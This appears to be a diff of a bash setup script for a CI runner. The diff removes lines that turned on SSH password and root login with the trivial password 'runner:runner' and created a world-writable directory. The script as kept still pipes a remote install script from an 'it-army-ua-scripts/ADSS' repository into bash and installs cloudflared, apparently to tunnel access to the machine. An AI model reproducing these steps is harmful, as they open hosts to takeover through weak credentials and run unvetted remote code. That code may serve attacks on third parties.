@@ -1,12 +1,6 @@
 #!/bin/bash
 set -e
 
-echo "[*] setup system"
-sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
-sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-sudo echo "runner:runner" | chpasswd
-sudo systemctl restart ssh
-
 echo "[*] Run install script"
 curl -fsSL https://raw.githubusercontent.com/it-army-ua-scripts/ADSS/install/install.sh | bash -s
 
@@ -15,9 +9,6 @@ sudo curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/
   -o /usr/local/bin/cloudflared
 sudo chmod +x /usr/local/bin/cloudflared
 
-echo "[*] Prepare directories"
-sudo mkdir -p /mnt/repo/test
-sudo chmod 777 /mnt/repo/test
 
 echo "[*] Preparing config"
 # 注意：这里不使用 sudo，避免 gh auth 失效
